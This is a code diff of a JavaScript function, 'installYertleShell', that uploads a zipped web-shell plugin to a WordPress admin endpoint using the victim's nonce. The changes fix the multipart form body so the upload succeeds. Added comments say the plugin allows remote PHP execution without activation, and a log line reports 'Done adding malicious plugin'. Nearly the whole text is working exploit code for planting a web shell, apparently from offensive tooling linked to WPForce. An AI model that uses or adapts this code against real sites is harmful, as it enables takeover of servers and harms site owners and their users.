@@ -187,7 +187,7 @@ function installYertleShell()
 			// rando binaries on github. Replace this
 			// with your own. I didn't put anything
 			// extra malicious in there, but why 
-			// should you trust me?
+			// should you trust me? Plot spoiler, you shouldn't.
 
 			// Created a script to convert files
 			// into the javascript buffer format,
@@ -246,7 +246,7 @@ function installYertleShell()
 
 			var fileSize = pluginZipFile.length;
 
-			var boundary = "------827901983029388724982374023840";
+			var boundary = "---------------------------82520842616842250352141452311";
 
 			var uploadURI = "/wp-admin/update.php?action=upload-plugin";
 
@@ -254,29 +254,27 @@ function installYertleShell()
 			uploadXhr.open("POST", uploadURI, true);
 
 			uploadXhr.setRequestHeader("Content-Type", "multipart/form-data; boundary=" + boundary);
+			uploadXhr.setRequestHeader("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8");
+			uploadXhr.setRequestHeader("Upgrade-Insecure-Requests", "1");
 
-			// This isn't allowed by browsers. Why did this work in my 
-			// old script... hmmm...
-			//uploadXhr.setRequestHeader("Content-Length", fileSize);
-
-			var body = boundary + "\r\n";
+			var body = "--" + boundary + "\r\n";
 			body += 'Content-Disposition: form-data; name="_wpnonce"' + '\r\n\r\n';
 			body += nonceVal + "\r\n"; 
 
-			body += boundary + "\r\n";
+			body += "--" + boundary + "\r\n";
 			body += 'Content-Disposition: form-data; name="_wp_http_referer"' + "\r\n\r\n";
 			body += "/wp-admin/plugin-install.php" + "\r\n";
 
 
-			body += boundary + "\r\n";
+			body += "--" + boundary + "\r\n";
 			body += 'Content-Disposition: form-data; name="pluginzip"; filename="shell.zip"' + "\r\n";
 			body += "Content-Type: application/zip" + "\r\n\r\n";
 			body += pluginZipFile + "\r\n";
 
-			body += boundary + "\r\n";
+			body += "--" + boundary + "\r\n";
 			body += 'Content-Disposition: form-data; name="install-plugin-submit"' + "\r\n\r\n";
 			body += "Install Now" + "\r\n";
-			body += boundary;
+			body += "--" + boundary + "--\r\n\r\n";
 
 			var aBody = new Uint8Array(body.length);
 			for (var i = 0; i < aBody.length; i++)
@@ -285,8 +283,14 @@ function installYertleShell()
 			}
 			uploadXhr.send(new Blob([aBody]));
 
-
-			// Don't forget to activate the plugin you numbnut.
+			console.log("Done adding malicious plugin");
+			// This is fun, you don't actually have to activate the yertle plugin
+			// to use it. 
+			// You can now use the yertle script to interact with the server by 
+			// sending php code, assumign that's the plugin you added. That's
+			// what's in the zip file embedded in this javascript example
+			// See WPForce:
+			// https://github.com/n00py/WPForce
 
 		}
 	}
